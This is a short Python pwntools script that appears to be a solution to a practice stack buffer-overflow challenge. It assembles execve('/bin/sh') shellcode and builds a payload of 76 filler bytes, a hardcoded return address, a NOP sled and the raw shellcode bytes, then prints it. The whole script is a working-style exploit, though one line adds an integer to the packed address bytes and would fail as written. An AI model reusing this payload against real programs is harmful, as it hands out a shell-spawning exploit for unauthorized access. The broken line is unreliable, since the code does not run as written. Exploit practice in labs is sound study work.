from pwn import *

def execve():
    # constraints:  eax = 0x0b
    #               ebx = ptr -> '/bin/sh\x00'
    #               ecx = edx = 0
    # return a shellcode of `execve('/bin/sh\x00', 0, 0)`

    shellcode = """
        mov eax, 0x0b
        push 0x0068732f   
        push 0x6e69622f  
        mov ebx, esp    
        xor ecx, ecx    
        xor edx, edx    
        int 0x80        
    """

    return asm(shellcode)

# execve() -> shellcode = "\xb8\x0b\x00\x00\x00h/sh\x00h/bin\x89\xe31\xc91\xd2\xcd\x80"
payload =  "A"*76
payload += p32(0xbffff850) + 0x30                                           # somewhere between nop
payload += "\x90\x90\x90\x90" * 0x100                                       # nop
payload += "\xb8\x0b\x00\x00\x00h/sh\x00h/bin\x89\xe31\xc91\xd2\xcd\x80"    # shellcode
print(payload)